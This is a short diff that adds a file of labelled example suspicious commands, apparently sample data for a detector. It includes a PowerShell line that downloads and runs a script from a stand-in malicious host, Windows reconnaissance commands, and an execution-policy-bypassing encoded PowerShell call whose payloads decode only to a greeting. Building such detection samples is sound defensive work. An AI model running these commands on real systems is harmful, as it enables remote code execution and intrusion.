@@ -1,0 +1,13 @@
+# Example of a potentially malicious PowerShell script
+Invoke-Expression "DownloadString('http://malicious-site.com/malware.ps1')"
+
+# Example of a network reconnaissance command
+systeminfo
+net user
+nbtstat -A 192.168.1.1
+
+# Example of encoded malicious payload
+echo "SGVsbG8sIFdvcmxkIQ==" | base64 --decode
+
+# Example of another suspicious command
+powershell.exe -nop -exec bypass -encodedcommand SGVsbG8sIFdvcmxkIQ==
